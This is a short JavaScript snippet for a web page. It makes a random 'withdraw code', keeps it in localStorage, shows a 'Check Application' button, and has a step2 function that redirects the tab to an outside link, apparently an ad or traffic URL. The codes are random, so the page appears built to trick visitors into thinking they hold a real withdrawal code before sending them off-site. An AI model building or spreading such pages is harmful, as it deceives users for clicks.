let pholder=document.getElementById('wd');
let finalcode=localStorage.getItem('code');
let btnsub=document.getElementById('btnsub');


if(finalcode !=null ){
    pholder.innerHTML=finalcode;
    btnsub.textContent='Check Application'
    console.log('final code is set : '+finalcode);
}else{
    pholder.innerHTML=withdrawcode(5);
}
        
            function withdrawcode(code_lenght){
              var code='';
              var chars ='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12334567890';
              for(var i,i=0;i<code_lenght;i++){
                code +=chars.charAt(Math.floor(Math.random()*chars.length));
              }
              localStorage.setItem('code',code);
               return code
            }

            function step2(){
              window.open("//oackoubs.com/4/4594571","_self");
            }



// let wd=document.getElementById('wd');
// let ket=wd.value;
// console.log(ket);
